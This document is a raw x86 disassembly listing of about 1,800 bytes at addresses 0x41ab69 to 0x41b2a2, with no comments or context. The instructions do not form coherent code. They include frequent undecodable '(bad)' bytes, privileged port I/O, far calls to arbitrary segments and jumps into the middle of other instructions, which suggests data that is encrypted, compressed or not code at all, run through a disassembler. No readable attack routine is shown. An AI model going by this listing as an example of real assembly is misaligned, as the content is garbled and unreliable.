  41ab69:	xchg   esp,eax
  41ab6b:	cdq    
  41ab6c:	in     al,0x1c
  41ab6e:	jecxz  0x41ab5c
  41ab70:	sub    ebp,DWORD PTR [edx]
  41ab72:	imul   esi,DWORD PTR [ebp+ecx*4+0x78],0x3552e6d1
  41ab7a:	inc    ecx
  41ab7b:	mov    ebp,0xc7ecd63b
  41ab80:	xchg   esp,eax
  41ab81:	push   esi
  41ab82:	not    BYTE PTR [esi-0x25]
  41ab85:	jmp    0xa564ae10
  41ab8a:	xor    BYTE PTR [edx-0x6],bl
  41ab8d:	icebp  
  41ab8e:	mov    edi,0xbfc5d910
  41ab93:	push   ds
  41ab94:	inc    bx
  41ab96:	dec    eax
  41ab97:	pop    ds
  41ab98:	cmp    al,0x21
  41ab9a:	nop
  41ab9b:	jge    0x41ab91
  41ab9d:	cmp    DWORD PTR [esi+0x62],esi
  41aba0:	ins    DWORD PTR es:[edi],dx
  41aba1:	(bad)  
  41aba2:	xor    al,0xb1
  41aba4:	sub    eax,ebx
  41aba6:	shl    DWORD PTR [ebp+eiz*4+0x2a],1
  41abaa:	aaa    
  41abab:	sar    BYTE PTR [esi-0x1002462f],1
  41abb1:	out    0xbd,al
  41abb3:	popf   
  41abb4:	sbb    eax,0x9f118cea
  41abb9:	test   al,0xa4
  41abbb:	dec    esi
  41abbc:	pop    esp
  41abbd:	mov    BYTE PTR gs:[esi],ah
  41abc0:	inc    eax
  41abc1:	xchg   DWORD PTR ds:0xcbaa4c8b,ebx
  41abc7:	cmp    edi,DWORD PTR [esi+ebp*4+0x4069e3ac]
  41abce:	inc    ecx
  41abcf:	or     eax,0x9b9d3529
  41abd4:	(bad)  
  41abd5:	(bad)  
  41abd6:	push   eax
  41abd7:	fmul   DWORD PTR [edx]
  41abd9:	pop    ebp
  41abda:	inc    ebx
  41abdb:	stos   BYTE PTR es:[edi],al
  41abdc:	repz stc 
  41abde:	ins    BYTE PTR es:[edi],dx
  41abdf:	mov    bh,0x5f
  41abe1:	mov    edi,0xfba06ba3
  41abe6:	arpl   sp,ax
  41abe8:	loopne 0x41abee
  41abea:	xchg   ebx,eax
  41abeb:	pop    ebx
  41abec:	shl    DWORD PTR [ebx+0x2],1
  41abef:	or     DWORD PTR [ebp+0x21],esp
  41abf2:	stos   BYTE PTR es:[edi],al
  41abf3:	and    BYTE PTR [edi],dl
  41abf5:	jae    0x946d1023
  41abfb:	push   ebp
  41abfc:	jbe    0x41ac4c
  41abfe:	xor    DWORD PTR [esi],ecx
  41ac00:	lods   al,BYTE PTR ds:[esi]
  41ac01:	mov    bh,0xca
  41ac03:	cdq    
  41ac04:	push   es
  41ac05:	fidiv  DWORD PTR [esi+0xf]
  41ac08:	test   al,0xb
  41ac0a:	shl    edx,1
  41ac0c:	push   ecx
  41ac0d:	(bad)  
  41ac0f:	ds call 0x4e16bbd6
  41ac15:	sub    eax,0x4b257238
  41ac1a:	xchg   ecx,eax
  41ac1b:	shr    DWORD PTR [edi-0x71],cl
  41ac1e:	into   
  41ac1f:	test   eax,0xab70b2a4
  41ac24:	sbb    DWORD PTR [eax],0xcb1aee5f
  41ac2a:	cs ja  0x41ac1f
  41ac2d:	push   ss
  41ac2e:	sub    BYTE PTR [edx-0x6f],dl
  41ac31:	add    eax,0xcc7824b7
  41ac36:	sbb    bl,dl
  41ac38:	aas    
  41ac39:	add    edi,DWORD PTR [eax-0x629e1983]
  41ac3f:	cdq    
  41ac40:	stc    
  41ac41:	mov    al,ds:0xd26237e7
  41ac46:	dec    ebx
  41ac47:	outs   dx,DWORD PTR ds:[esi]
  41ac48:	xchg   ebp,eax
  41ac49:	add    DWORD PTR ds:0x5cd72366,eax
  41ac4f:	into   
  41ac50:	jns    0x41ac08
  41ac52:	cmc    
  41ac53:	inc    edi
  41ac54:	pop    es
  41ac55:	test   BYTE PTR [eax-0xc5929b5],bh
  41ac5b:	adc    BYTE PTR [ebx-0x16],dl
  41ac5e:	enter  0x5b04,0x22
  41ac62:	mov    ebp,0xeaa6d5c2
  41ac67:	ret    0x929a
  41ac6a:	pop    ds
  41ac6b:	or     al,0x98
  41ac6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac6e:	jne    0x41acb1
  41ac70:	(bad)
  41ac73:	sub    al,0x41
  41ac75:	gs xchg ecx,eax
  41ac77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac78:	jne    0x41acab
  41ac7a:	mov    esi,0x9e09fc3c
  41ac7f:	pop    ebx
  41ac80:	mov    dh,0x19
  41ac82:	xlat   BYTE PTR ds:[ebx]
  41ac83:	adc    DWORD PTR [edi-0x580445fc],ecx
  41ac89:	adc    BYTE PTR [esi],dh
  41ac8b:	inc    esp
  41ac8c:	xor    eax,0xdc3733a6
  41ac91:	adc    al,0x3
  41ac93:	cmp    al,0xc7
  41ac95:	popa   
  41ac96:	adc    DWORD PTR [esi-0x7d],ebx
  41ac99:	js     0x41acda
  41ac9b:	and    BYTE PTR [edx],dl
  41ac9d:	pop    esi
  41ac9e:	mov    ecx,0xc64569bb
  41aca3:	inc    edx
  41aca4:	das    
  41aca5:	in     al,0x73
  41aca7:	sbb    BYTE PTR [edi-0x70],ah
  41acaa:	aad    0x18
  41acac:	jo     0x41acc5
  41acae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acaf:	mov    ss,edi
  41acb1:	push   ebp
  41acb2:	mov    dh,0x67
  41acb4:	test   al,0x59
  41acb6:	pop    ecx
  41acb7:	arpl   WORD PTR [eax+0x68],di
  41acba:	sbb    DWORD PTR [edi-0x60714f6f],edx
  41acc0:	jp     0x41ac6a
  41acc2:	in     eax,0xea
  41acc4:	xchg   esi,eax
  41acc5:	lock push 0x4cd5682
  41accb:	outs   dx,DWORD PTR ds:[esi]
  41accc:	out    0x68,eax
  41acce:	jb     0x41aca1
  41acd0:	add    al,0xd1
  41acd2:	rcl    BYTE PTR [edi+0x5d],0xf4
  41acd6:	and    esp,DWORD PTR [ebp-0x6e]
  41acd9:	or     eax,0x5b194299
  41acde:	dec    esp
  41acdf:	sti    
  41ace0:	popf   
  41ace1:	popa   
  41ace2:	test   BYTE PTR [esi+0x37c096d1],0x9a
  41ace9:	jl     0x41ad0d
  41aceb:	neg    DWORD PTR [esi+eax*4+0x6c]
  41acef:	bound  ebx,QWORD PTR [ebx-0x7a4be260]
  41acf5:	dec    eax
  41acf6:	into   
  41acf7:	nop
  41acf8:	repnz mov DWORD PTR [ecx],0x63e0e474
  41acff:	inc    esp
  41ad00:	adc    BYTE PTR [eax+0x56],0x4b
  41ad04:	adc    DWORD PTR [edx+0x22],edx
  41ad07:	push   edx
  41ad08:	ja     0x41ad02
  41ad0a:	arpl   WORD PTR [edi],cx
  41ad0c:	ror    DWORD PTR [eax+0x59],1
  41ad0f:	mov    edi,0x866bd2bb
  41ad14:	scas   eax,DWORD PTR es:[edi]
  41ad15:	jo     0x41acca
  41ad17:	out    0xd,eax
  41ad19:	pop    esi
  41ad1a:	pop    esp
  41ad1b:	(bad)  
  41ad1d:	mov    dl,0x85
  41ad1f:	test   DWORD PTR [eax+0x1e0e195d],ebx
  41ad25:	dec    ebx
  41ad26:	test   al,0x66
  41ad28:	add    DWORD PTR [ecx-0x2167123e],edx
  41ad2e:	clc    
  41ad2f:	fwait
  41ad30:	push   esi
  41ad31:	xchg   edx,eax
  41ad32:	lahf   
  41ad33:	ror    BYTE PTR [eax],cl
  41ad35:	pop    ebx
  41ad36:	jns    0x41ad29
  41ad38:	adc    dl,BYTE PTR [ebx+0x18]
  41ad3b:	leave  
  41ad3c:	js     0x41ada6
  41ad3e:	xor    bh,BYTE PTR [eax+0x10]
  41ad41:	ror    DWORD PTR [ebx],0x2c
  41ad44:	in     al,0xbc
  41ad46:	jnp    0x41acfa
  41ad48:	ja     0x41adc3
  41ad4a:	ins    DWORD PTR es:[edi],dx
  41ad4b:	call   0x16142978
  41ad50:	out    0xad,eax
  41ad52:	add    al,0x5b
  41ad54:	adc    DWORD PTR [esi+0x1d],0x3ea60a98
  41ad5b:	sub    BYTE PTR [edx],dh
  41ad5d:	cmp    ecx,DWORD PTR [edi-0x46d6bb6f]
  41ad63:	fcomp  QWORD PTR [esi+0x7e41f8bc]
  41ad69:	push   ebx
  41ad6a:	jge    0x41acfc
  41ad6c:	jnp    0x41adb6
  41ad6e:	fsubr  DWORD PTR [ecx-0x36]
  41ad71:	fist   DWORD PTR [ebx+edx*8+0x1d]
  41ad75:	cmp    al,0x1d
  41ad77:	in     eax,0x70
  41ad79:	jo     0x41ade0
  41ad7b:	mov    ch,0x2a
  41ad7d:	(bad)  
  41ad7e:	mov    ebp,es
  41ad80:	add    bl,cl
  41ad82:	lahf   
  41ad83:	cdq    
  41ad84:	xchg   BYTE PTR [ebx-0x74],ch
  41ad87:	and    BYTE PTR [esi-0x7],bl
  41ad8a:	dec    ecx
  41ad8b:	add    eax,0xa6774c5
  41ad90:	(bad)  
  41ad91:	stos   DWORD PTR es:[edi],eax
  41ad92:	test   eax,0xd583fdee
  41ad97:	lods   al,BYTE PTR ds:[esi]
  41ad98:	mov    bh,0xa1
  41ad9a:	mov    ch,0x62
  41ad9c:	sub    DWORD PTR [esi+0x5e],eax
  41ad9f:	inc    esp
  41ada0:	dec    ebp
  41ada1:	outs   dx,WORD PTR ds:[esi]
  41ada3:	jbe    0x41ad58
  41ada5:	arpl   WORD PTR [ebx],bp
  41ada7:	or     al,0xe3
  41ada9:	rol    BYTE PTR [edx-0x6296682b],0x81
  41adb0:	cli    
  41adb1:	mov    dl,0x5f
  41adb3:	fcmovnu st,st(2)
  41adb5:	sti    
  41adb6:	aaa    
  41adb7:	mov    cl,0xe4
  41adb9:	jp     0x41adf1
  41adbb:	add    ch,BYTE PTR [edi]
  41adbd:	jg     0x41ad8a
  41adbf:	or     eax,0x440c0aeb
  41adc4:	xor    al,BYTE PTR [edx-0x7d707b0f]
  41adca:	jbe    0x41ae1a
  41adcc:	xor    al,0x60
  41adce:	xor    al,0x68
  41add0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41add1:	mov    dl,0x93
  41add3:	push   ecx
  41add4:	adc    eax,0x61ba22f3
  41add9:	dec    esi
  41adda:	aam    0x25
  41addc:	adc    al,bl
  41adde:	fistp  QWORD PTR [ebp-0x3e]
  41ade1:	div    BYTE PTR [edx+edi*8+0x6817b97b]
  41ade8:	or     bh,ah
  41adea:	fidivr DWORD PTR [ecx+0x572b4fff]
  41adf0:	scas   al,BYTE PTR es:[edi]
  41adf1:	stc    
  41adf2:	cld    
  41adf3:	xchg   ebx,eax
  41adf4:	xchg   ebx,eax
  41adf5:	xor    esi,DWORD PTR [edi+0xddda0d6]
  41adfb:	mov    eax,ds:0xa556c69f
  41ae00:	dec    ebx
  41ae01:	pop    ebp
  41ae02:	add    edx,DWORD PTR [ecx-0x15b62f86]
  41ae08:	retf   
  41ae09:	(bad)  
  41ae0a:	aam    0xa7
  41ae0c:	and    DWORD PTR [edx+0x5d52ee1c],ebp
  41ae12:	push   esi
  41ae13:	psraw  mm7,QWORD PTR [ebx+edx*2+0x40b3ecd7]
  41ae1b:	cmp    BYTE PTR [edi],al
  41ae1d:	inc    esi
  41ae1e:	add    al,0xd7
  41ae20:	mov    esp,0x21387709
  41ae25:	cwde   
  41ae26:	jge    0x41ae6a
  41ae28:	mov    esi,0xf8060539
  41ae2d:	and    DWORD PTR ds:0x8b35bfca,0x73
  41ae34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae35:	ss cwde 
  41ae37:	iret   
  41ae38:	xor    al,0x59
  41ae3a:	inc    esi
  41ae3b:	pop    esi
  41ae3c:	sub    DWORD PTR [ecx],ebx
  41ae3e:	cmp    dh,BYTE PTR [ebx+ecx*4+0x73]
  41ae42:	(bad)  
  41ae43:	lods   eax,DWORD PTR ds:[esi]
  41ae44:	jecxz  0x41ae85
  41ae46:	enter  0x4c68,0x21
  41ae4a:	add    edi,eax
  41ae4c:	aad    0x1a
  41ae4e:	xlat   BYTE PTR ds:[ebx]
  41ae4f:	je     0x41ae0f
  41ae51:	fwait
  41ae52:	dec    ebx
  41ae53:	in     eax,dx
  41ae54:	popf   
  41ae55:	shl    BYTE PTR [eax],cl
  41ae57:	imul   edx,DWORD PTR [edx+edx*8],0x79
  41ae5b:	ss and eax,0x3dfe1dad
  41ae61:	(bad)  
  41ae62:	fistp  QWORD PTR [esi+0x6c]
  41ae65:	push   edx
  41ae66:	test   al,0xb1
  41ae68:	ins    DWORD PTR es:[edi],dx
  41ae69:	fcmovnbe st,st(2)
  41ae6b:	xchg   dl,al
  41ae6d:	cmp    al,0xd5
  41ae6f:	int3   
  41ae70:	dec    ecx
  41ae71:	sub    cl,dl
  41ae73:	in     al,0xe4
  41ae75:	or     bh,BYTE PTR [edi+0x14]
  41ae78:	jo     0x41ae18
  41ae7a:	es sti 
  41ae7c:	adc    ah,BYTE PTR [ebp+0x66]
  41ae7f:	push   ss
  41ae80:	and    eax,0xbf58df78
  41ae85:	int3   
  41ae86:	shr    dh,0xe0
  41ae89:	xchg   DWORD PTR [edi+0x5e],ecx
  41ae8c:	dec    edx
  41ae8d:	shr    al,1
  41ae8f:	dec    ecx
  41ae90:	out    0x49,eax
  41ae92:	pop    ss
  41ae93:	icebp  
  41ae94:	jbe    0x41ae84
  41ae96:	test   BYTE PTR [esi],ah
  41ae98:	les    esp,FWORD PTR [eax]
  41ae9a:	(bad)  
  41ae9b:	mov    ebx,0xef33f45b
  41aea0:	rcl    edi,cl
  41aea2:	test   al,0x84
  41aea4:	push   ecx
  41aea5:	push   eax
  41aea6:	in     al,dx
  41aea7:	mov    edi,0xe8a59d5e
  41aeac:	sub    bl,bl
  41aeae:	test   eax,0xd5985fe3
  41aeb3:	sar    BYTE PTR [ecx-0xa],0x21
  41aeb7:	repz jp 0x41aea5
  41aeba:	fwait
  41aebb:	push   es
  41aebc:	out    dx,eax
  41aebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aebe:	push   cs
  41aebf:	fwait
  41aec0:	lahf   
  41aec1:	pusha  
  41aec2:	add    dl,dh
  41aec4:	loope  0x41aee5
  41aec6:	push   esp
  41aec7:	fist   WORD PTR ds:0xe02f7b92
  41aecd:	jne    0x41aeb5
  41aecf:	(bad)  
  41aed0:	cmp    al,0xa
  41aed2:	dec    eax
  41aed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aed4:	sub    edx,edi
  41aed6:	sbb    BYTE PTR cs:[edi-0x767a7ff5],al
  41aedd:	fs in  al,dx
  41aedf:	cs push ebx
  41aee1:	cmp    bl,BYTE PTR [ebx-0x21567ae1]
  41aee7:	pop    ds
  41aee8:	inc    esp
  41aee9:	jae    0x41aec4
  41aeeb:	call   0x93db844f
  41aef0:	add    eax,0x2e7fe02b
  41aef5:	pop    ecx
  41aef6:	hlt    
  41aef7:	add    al,0x49
  41aef9:	dec    ebp
  41aefa:	loop   0x41aecd
  41aefc:	loope  0x41af60
  41aefe:	xlat   BYTE PTR ds:[ebx]
  41aeff:	fld    DWORD PTR ds:0xa3aa6a1c
  41af05:	dec    esi
  41af06:	test   eax,ebp
  41af08:	inc    edx
  41af09:	lock inc ebp
  41af0b:	int    0xc9
  41af0d:	xchg   esp,eax
  41af0e:	arpl   WORD PTR [edi+0x7f6037d9],bx
  41af14:	test   eax,0xb0e04403
  41af19:	adc    DWORD PTR [ebx],0x25572f20
  41af1f:	and    eax,0x5582e1ef
  41af24:	scas   eax,DWORD PTR es:[edi]
  41af25:	inc    ebx
  41af26:	sbb    edx,eax
  41af28:	xor    DWORD PTR [ecx-0x6d7ead33],edi
  41af2e:	dec    eax
  41af2f:	xchg   edi,eax
  41af30:	bound  edx,QWORD PTR ds:0x8e60a712
  41af37:	pop    eax
  41af38:	mov    eax,ds:0xa575d9bf
  41af3d:	pop    esi
  41af3e:	lahf   
  41af3f:	push   0x43
  41af41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af42:	push   ebp
  41af43:	(bad)
  41af46:	xchg   esi,eax
  41af47:	push   ss
  41af48:	sbb    al,0xf7
  41af4a:	stos   DWORD PTR es:[edi],eax
  41af4b:	and    al,0x0
  41af4d:	xchg   esi,eax
  41af4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af4f:	leave  
  41af50:	dec    esp
  41af51:	push   0xcf18abb6
  41af56:	shl    DWORD PTR [edx-0x1f],0x73
  41af5a:	jmp    FWORD PTR [edi]
  41af5c:	pop    es
  41af5d:	add    edx,DWORD PTR [edx+ecx*8+0x5f]
  41af61:	cs mov esp,0x381df141
  41af67:	cmp    eax,0x9b823205
  41af6c:	sbb    BYTE PTR [eax+0x59af76c6],cl
  41af72:	push   edx
  41af73:	dec    esi
  41af74:	mov    al,0xb3
  41af76:	gs cs jl 0x41af1a
  41af7a:	shl    BYTE PTR [ecx],1
  41af7c:	cdq    
  41af7d:	sar    BYTE PTR [edi],0xcd
  41af80:	ja     0x41af7d
  41af82:	adc    dl,BYTE PTR ds:0x9ab92ed2
  41af88:	jmp    0xc300:0x731867f7
  41af8f:	rol    BYTE PTR [ecx+edi*2-0x3fa420bc],1
  41af96:	(bad)  [edx]
  41af98:	xchg   ebp,eax
  41af99:	ja     0x41b006
  41af9b:	mov    ds,esi
  41af9d:	test   eax,0xeaf964ef
  41afa2:	dec    ecx
  41afa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afa5:	pop    es
  41afa6:	xor    al,0xfd
  41afa8:	int3   
  41afa9:	and    DWORD PTR ds:0xa2cd5bbe,eax
  41afaf:	fisub  DWORD PTR [ebx+0x5fe49ca3]
  41afb5:	mov    edx,0x700dd0c3
  41afba:	jg     0x41b008
  41afbc:	cli    
  41afbd:	dec    ebp
  41afbe:	dec    ebp
  41afbf:	popa   
  41afc0:	(bad)  
  41afc1:	xor    eax,0xe8bae9ae
  41afc6:	inc    esi
  41afc7:	outs   dx,DWORD PTR ds:[esi]
  41afc8:	pop    edi
  41afc9:	mov    esp,0xb4fd52a8
  41afce:	cmp    BYTE PTR [edx+0x53],cl
  41afd1:	dec    edx
  41afd2:	mov    esi,0x16d6f86e
  41afd7:	xor    cl,BYTE PTR [edi+0x10]
  41afda:	mov    ah,dl
  41afdc:	sbb    esi,DWORD PTR [ebx]
  41afde:	pop    ecx
  41afdf:	into   
  41afe0:	pop    esp
  41afe1:	arpl   WORD PTR [edx-0x54],si
  41afe4:	mov    ch,BYTE PTR [edi+0x484c0e0b]
  41afea:	(bad)
  41afed:	loop   0x41b031
  41afef:	cmp    eax,0xa0cefdd3
  41aff4:	dec    esp
  41aff5:	or     al,0xc6
  41aff7:	call   0x57fd:0x95333b07
  41affe:	icebp  
  41afff:	(bad)  
  41b000:	jmp    0x41b019
  41b002:	rol    BYTE PTR [ebx+0x633b4bc2],1
  41b008:	icebp  
  41b009:	xor    DWORD PTR [edx+0x52bb6a78],esp
  41b00f:	mul    DWORD PTR [ebp-0x76]
  41b012:	cmp    ebx,DWORD PTR [edx+0x0]
  41b015:	test   DWORD PTR [eax],esi
  41b017:	(bad)  
  41b018:	shl    BYTE PTR [ebx],1
  41b01a:	cs stc 
  41b01c:	add    BYTE PTR [edi+0x75a27c3e],0xe7
  41b023:	(bad)  
  41b024:	shr    BYTE PTR [esi],cl
  41b026:	mov    ecx,0x4f53df98
  41b02b:	scas   al,BYTE PTR es:[edi]
  41b02c:	push   ds
  41b02d:	retf   
  41b02e:	leave  
  41b02f:	mov    cs,WORD PTR [ebp+0x36]
  41b032:	push   esi
  41b033:	push   cs
  41b034:	jge    0x41afda
  41b036:	int3   
  41b037:	sbb    DWORD PTR [ebx+0x6ce4fb39],0x9
  41b03e:	add    ebp,DWORD PTR ds:0x9eeaa907
  41b044:	call   0xa3d4:0x5462bf38
  41b04b:	push   edx
  41b04c:	cs cmp esi,edx
  41b04f:	repz into 
  41b051:	xor    eax,DWORD PTR [esi-0x3ef789a0]
  41b057:	mov    ebx,0xcef9e443
  41b05c:	add    ecx,DWORD PTR [ebx-0x1e]
  41b05f:	adc    esp,DWORD PTR [ecx-0x2c]
  41b062:	sti    
  41b063:	nop
  41b064:	fild   WORD PTR ds:0x7baf7d16
  41b06a:	jle    0x41b029
  41b06c:	mov    ds:0x39ef29c0,al
  41b071:	and    edi,DWORD PTR [eax-0x50]
  41b074:	je     0x41b03a
  41b076:	leave  
  41b077:	stos   DWORD PTR es:[edi],eax
  41b078:	or     BYTE PTR [esi+esi*8],bh
  41b07b:	cmp    BYTE PTR [ecx-0x6815c8f2],0x16
  41b082:	or     BYTE PTR [edi],cl
  41b084:	sub    edi,DWORD PTR [eax+0x60]
  41b087:	pop    es
  41b088:	xchg   esi,eax
  41b089:	jp     0x41b02c
  41b08b:	pop    ds
  41b08c:	fbstp  TBYTE PTR [edi-0x1]
  41b08f:	call   DWORD PTR ds:0xe3c934a7
  41b095:	jle    0x41b0e5
  41b097:	(bad)  
  41b099:	sbb    al,0x1a
  41b09b:	scas   eax,DWORD PTR es:[edi]
  41b09c:	stos   BYTE PTR es:[edi],al
  41b09d:	sub    al,0x0
  41b09f:	mov    esi,esi
  41b0a1:	nop
  41b0a2:	test   ch,bh
  41b0a4:	xchg   esp,eax
  41b0a5:	sub    BYTE PTR [ebx+0x1ca75fa1],ch
  41b0ab:	sub    BYTE PTR [ebp-0x75],ch
  41b0ae:	test   DWORD PTR [esp+ebp*4],0xd8a3275c
  41b0b5:	mov    esp,0xb256f9f0
  41b0ba:	ins    BYTE PTR es:[edi],dx
  41b0bb:	inc    esi
  41b0bc:	push   ecx
  41b0bd:	lds    ebp,FWORD PTR [eax]
  41b0bf:	pop    ebp
  41b0c0:	fcmovnb st,st(4)
  41b0c2:	inc    eax
  41b0c3:	ret    0x3768
  41b0c6:	fs jnp 0x41b098
  41b0c9:	popa   
  41b0ca:	jne    0x41b13f
  41b0cc:	aas    
  41b0cd:	dec    eax
  41b0ce:	and    al,0xac
  41b0d0:	inc    eax
  41b0d1:	cs push esi
  41b0d3:	mov    ds:0xe35e5bac,al
  41b0d8:	popa   
  41b0d9:	fsub   DWORD PTR [ebx]
  41b0db:	add    dh,BYTE PTR [ecx]
  41b0dd:	shl    BYTE PTR [ecx+0xc091192],1
  41b0e3:	dec    ebp
  41b0e4:	jbe    0x41b089
  41b0e6:	jns    0x41b11a
  41b0e8:	ja     0x41b09b
  41b0ea:	clc    
  41b0eb:	xor    eax,0x5cafa69d
  41b0f0:	jmp    0x7965b41d
  41b0f5:	out    dx,eax
  41b0f6:	xor    ecx,DWORD PTR [ebx-0x1810bb33]
  41b0fc:	fsubp  st(2),st
  41b0fe:	adc    dl,ch
  41b100:	jns    0x41b158
  41b102:	cwde   
  41b103:	out    dx,al
  41b104:	or     dh,BYTE PTR [esi]
  41b106:	or     al,0xbd
  41b108:	xlat   BYTE PTR ds:[ebx]
  41b109:	mov    ds:0x335fccaa,al
  41b10e:	mov    cl,0xc6
  41b110:	mov    al,cs:0x38f901a0
  41b116:	sub    dl,BYTE PTR [eax]
  41b118:	sub    cl,BYTE PTR [ebp-0x9]
  41b11b:	repz sbb eax,0xa2382afc
  41b121:	cmp    dh,BYTE PTR [edx]
  41b123:	dec    esp
  41b124:	sbb    ecx,edx
  41b126:	jle    0x41b0b6
  41b128:	shl    DWORD PTR [eax],0x9c
  41b12b:	pop    ebp
  41b12c:	ret    
  41b12d:	jmp    0x41b0f0
  41b12f:	mov    DWORD PTR [eax-0x4a5030e9],ebx
  41b135:	inc    esp
  41b136:	(bad)  
  41b137:	clc    
  41b138:	jp     0x41b14f
  41b13a:	sub    BYTE PTR [ebp-0x36],bh
  41b13d:	pusha  
  41b13e:	imul   edx,DWORD PTR [eax+0x69b8a122],0xffffffbc
  41b145:	pop    ss
  41b146:	push   edi
  41b147:	ja     0x41b0d3
  41b149:	xchg   ebp,eax
  41b14a:	daa    
  41b14b:	dec    esi
  41b14c:	(bad)  
  41b14d:	mov    edi,0x4af90f70
  41b152:	jmp    0x212e9781
  41b157:	mov    bl,0x54
  41b159:	shr    DWORD PTR [eax-0x72fd54d3],cl
  41b15f:	add    cl,BYTE PTR [ebp+0x23fa4c14]
  41b165:	call   FWORD PTR [esi-0x71867619]
  41b16b:	and    ebp,DWORD PTR ds:0x1fe1cdbb
  41b171:	in     eax,0x4a
  41b173:	cmp    cl,BYTE PTR [ebx-0x1cb5b87a]
  41b179:	jno    0x41b12e
  41b17b:	ds pushf 
  41b17d:	shl    DWORD PTR [edi-0x57],cl
  41b180:	add    al,dh
  41b182:	pop    edx
  41b183:	loopne 0x41b174
  41b185:	sub    esp,eax
  41b187:	fwait
  41b188:	cwde   
  41b189:	fisttp WORD PTR [edi]
  41b18b:	std    
  41b18c:	fld    DWORD PTR [eax+0x12]
  41b18f:	das    
  41b190:	into   
  41b191:	imul   ecx,ebp,0xa4729b7e
  41b197:	(bad)  
  41b198:	lahf   
  41b199:	outs   dx,BYTE PTR ds:[esi]
  41b19a:	cmp    al,bh
  41b19c:	sti    
  41b19d:	in     al,0x75
  41b19f:	lods   eax,DWORD PTR ds:[esi]
  41b1a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1a1:	cpuid  
  41b1a3:	jno    0x41b164
  41b1a5:	icebp  
  41b1a6:	mov    cl,0xe5
  41b1a8:	pop    esp
  41b1a9:	mov    ecx,0x47717775
  41b1ae:	dec    esi
  41b1af:	push   ds
  41b1b0:	test   DWORD PTR [eax+0x4f],edx
  41b1b3:	imul   BYTE PTR [eax-0x70]
  41b1b6:	inc    edi
  41b1b7:	dec    ebp
  41b1b8:	cdq    
  41b1b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1ba:	dec    edx
  41b1bb:	or     bh,BYTE PTR [ebp+0x17]
  41b1be:	mov    esi,0xcf80d0ad
  41b1c3:	cmp    BYTE PTR [ebx+0x2c],ah
  41b1c6:	mov    cl,0xa8
  41b1c8:	scas   eax,DWORD PTR es:[edi]
  41b1c9:	hlt    
  41b1ca:	lods   eax,DWORD PTR ds:[esi]
  41b1cb:	jl     0x41b209
  41b1cd:	jno    0x41b1a8
  41b1cf:	or     edx,DWORD PTR [edx]
  41b1d1:	pop    edx
  41b1d2:	lds    edx,FWORD PTR [esi]
  41b1d4:	cdq    
  41b1d5:	and    al,0x51
  41b1d7:	retf   
  41b1d8:	imul   edx,DWORD PTR ds:0x545bb7fb,0x21
  41b1df:	inc    esp
  41b1e0:	push   ebx
  41b1e1:	ds leave 
  41b1e3:	(bad)  
  41b1e4:	mov    ss,WORD PTR [ebp+0x1c]
  41b1e7:	test   BYTE PTR [eax],bl
  41b1e9:	xor    al,0xd5
  41b1eb:	xor    al,0xcb
  41b1ed:	(bad)  
  41b1ee:	in     al,dx
  41b1ef:	in     eax,dx
  41b1f0:	loopne 0x41b1dc
  41b1f2:	and    DWORD PTR [eax],ebp
  41b1f4:	leave  
  41b1f5:	dec    ebp
  41b1f6:	sbb    ch,al
  41b1f8:	lock cli 
  41b1fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1fb:	inc    ecx
  41b1fc:	push   ds
  41b1fd:	dec    esp
  41b1fe:	sbb    BYTE PTR [ecx+0x78],bl
  41b201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b202:	int3   
  41b203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b204:	sbb    eax,ecx
  41b206:	inc    ebx
  41b207:	test   al,0x94
  41b209:	scas   eax,DWORD PTR es:[edi]
  41b20a:	xor    al,0x30
  41b20c:	jnp    0x41b23c
  41b20e:	xchg   DWORD PTR [ebx],ecx
  41b210:	jbe    0x41b243
  41b212:	sbb    edi,ebx
  41b214:	or     DWORD PTR [eax],0x8ac62b85
  41b21a:	rol    cl,0xb0
  41b21d:	dec    edi
  41b21e:	lods   al,BYTE PTR ds:[esi]
  41b21f:	jmp    0x49c628b9
  41b224:	ja     0x41b1e3
  41b226:	call   0x14c7:0x9460a4e6
  41b22d:	lahf   
  41b22e:	dec    ebp
  41b22f:	dec    ecx
  41b230:	mov    ebp,0x1e71de1c
  41b235:	inc    ebx
  41b236:	or     dh,BYTE PTR [eax]
  41b238:	sub    esp,DWORD PTR [edx+0x7]
  41b23b:	xchg   esi,eax
  41b23c:	inc    edi
  41b23d:	pop    esp
  41b23e:	add    eax,DWORD PTR [ebp-0x78]
  41b241:	ret    0xe944
  41b244:	aad    0x68
  41b246:	xchg   edx,eax
  41b247:	mov    ds:0x93c40661,eax
  41b24c:	inc    ecx
  41b24d:	or     eax,0xe038bad8
  41b252:	pusha  
  41b253:	sbb    dl,dl
  41b255:	mov    esi,0xe9589b56
  41b25a:	fsave  [ebx-0x6]
  41b25e:	call   0xcfd7:0xeaa33154
  41b265:	lds    ebp,FWORD PTR [esi-0x3f8ad7d]
  41b26b:	into   
  41b26c:	or     BYTE PTR [edi-0x58487a74],cl
  41b272:	sub    BYTE PTR [eax],bl
  41b274:	cmp    cl,BYTE PTR [edx+0x11]
  41b277:	push   ebx
  41b278:	mov    esp,0xc68158e2
  41b27d:	(bad)  
  41b27e:	(bad)  
  41b27f:	hlt    
  41b280:	test   eax,0xb4a3c371
  41b285:	fs add DWORD PTR fs:[eax+ebx*1],eax
  41b28a:	lock lss ebx,FWORD PTR [edx-0x15]
  41b28f:	jae    0x41b275
  41b291:	addr16 xor eax,0xa42b2f36
  41b297:	mov    bh,0xa1
  41b299:	inc    esp
  41b29a:	cdq    
  41b29b:	mov    ds:0xaa6d8bc1,eax
  41b2a0:	sti    
  41b2a1:	iret   
  41b2a2:	mov    WORD PTR [edi],ss
